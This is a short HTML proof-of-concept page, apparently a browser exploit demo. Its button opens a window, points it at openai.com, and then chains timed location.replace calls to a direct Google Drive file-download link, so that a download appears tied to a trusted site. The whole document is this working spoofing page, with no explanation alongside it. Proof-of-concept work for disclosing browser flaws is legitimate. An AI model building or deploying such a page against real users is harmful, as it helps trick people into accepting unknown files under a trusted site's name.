<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>poc</title>
  <script>
    function chainRedirect(w, urls, index = 0) {
      if (index < urls.length) {
        w.location.replace(urls[index]);
        setTimeout(() => chainRedirect(w, urls, index + 1), 1000);
      }
    }

    function startRedirect() {
      let w = window.open("");
      setTimeout(() => {
        chainRedirect(w, [
        "https://openai.com",
        "https://drive.usercontent.google.com/download?id=1pyh3Gp20w9m4sy4BYAls38IbEN2t8RNY&export=download&authuser=0&confirm=t&uuid=a0187592-23da-4e90-bce3-d18c37483ff7&at=AN8xHoom8UDsa0rGI1HwSYH-pLYo:1756640251918",
        "https://drive.usercontent.google.com/download?id=1pyh3Gp20w9m4sy4BYAls38IbEN2t8RNY&export=download&authuser=0&confirm=t&uuid=a0187592-23da-4e90-bce3-d18c37483ff7&at=AN8xHoom8UDsa0rGI1HwSYH-pLYo:1756640251918",
        ]);
      }, 1000);
    }
  </script>
</head>
<body>
  <button onclick="startRedirect()">Start</button>
</body>
</html>
